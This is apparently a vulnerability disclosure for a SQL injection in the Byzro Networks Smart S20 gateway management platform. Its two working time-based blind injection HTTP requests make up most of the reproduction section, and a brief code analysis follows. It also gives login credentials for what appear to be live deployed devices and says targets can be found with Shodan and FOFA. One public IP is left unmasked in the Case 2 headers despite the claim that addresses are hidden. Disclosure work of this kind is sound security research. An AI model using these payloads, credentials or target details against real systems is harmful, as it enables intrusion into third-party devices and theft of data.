There is a SQL injection vulnerability in Byzro Networks Smart S20 management platform

#### 1.Vulnerability description

Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet.
There is a SQL injection vulnerability in Byzro Networks Smart S20 gateway intelligent management platform. Attackers can exploit vulnerabilities to gain server permissions and manipulate server files to obtain sensitive information.

#### 2.Impact of vulnerabilities

Smart S20

#### 3.Vulnerability location

/sysmanage/sysmanageajax.php

#### 4.Recurrence of vulnerabilities

To protect privacy, the public IP addresses in the following examples have been coded and can be tested based on search engines such as shadon and fofa.

##### Case 1

(1)After entering the login page, the account password is admin/admin.

![](https://github.com/rockersiyuan/CVE/blob/main/smart%20s20.assets/image-20240128012332771.png)

(2)Construct the following POC and execute the blind injection successfully. Note: The cookie field needs to be replaced with the value after login, and test2 cannot be repeated during the test.

```
POST /sysmanage/sysmanageajax.php HTTP/1.1
Host: 221.xxx.xxx.134:8443
Cookie: PHPSESSID=f3723499e56eadbbdba2390af1bd85af
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

src=manageadmin&type=add&id=(select*from(select+if(length(database())=3,sleep(5),1))a)|1|1&value=test3|123456
```

![](https://github.com/rockersiyuan/CVE/blob/main/smart%20s20.assets/image-202401280119350441.png)

There is a delay in page response echo, which proves the existence of SQL injection vulnerability.

##### Case 2

(1)Enter the login page, the account password is admin/sssw-0476.

![](https://github.com/rockersiyuan/CVE/blob/main/smart%20s20.assets/image-20240128012351673.png)

(2)Construct the following POC and execute the blind injection successfully. Note: The cookie field needs to be replaced with the value after login, and test2 cannot be repeated during the test.

```
POST /sysmanage/sysmanageajax.php HTTP/1.11
Host: 58.xxx.xxx.60:8443
Cookie: PHPSESSID=b7e24f2cb8b51338e8531e0b50da49ee
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded;
Content-Length: 109
Origin: https://58.18.133.60:8443
Referer: https://58.18.133.60:8443/sysmanage/manageadmin.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 1.1.1.1
X-Originating-Ip: 1.1.1.1
X-Remote-Ip: 1.1.1.1
X-Remote-Addr: 1.1.1.1
Te: trailers
Connection: close

src=manageadmin&type=add&id=(select*from(select+if(length(database())=3,sleep(5),1))a)|1|1&value=test2|123456
```
![](https://github.com/rockersiyuan/CVE/blob/main/smart%20s20.assets/image-20240128011551226.png)

There is a delayed response, and the 5s is consistent with the injection statement, so there is a SQL injection vulnerability.

#### 5.Code analysis

In sysmanageajax.php, first of all, the $post_src and $post_type parameters are controllable and are passed in through the post method.

![](https://github.com/rockersiyuan/CVE/blob/main/smart%20s20.assets/image-20240128005938583.png)

Therefore, you can control the input of src=manageadmin and type=add, so that the program logic jumps to the content as shown below.

![](https://github.com/rockersiyuan/CVE/blob/main/smart%20s20.assets/image-0240128010425584.png)

The $rolseid parameter here is directly spliced into the SQL query statement without any security filtering, so there is a SQL injection point. The attacker only needs to control the id parameter passed in through the post method to cause SQL injection.
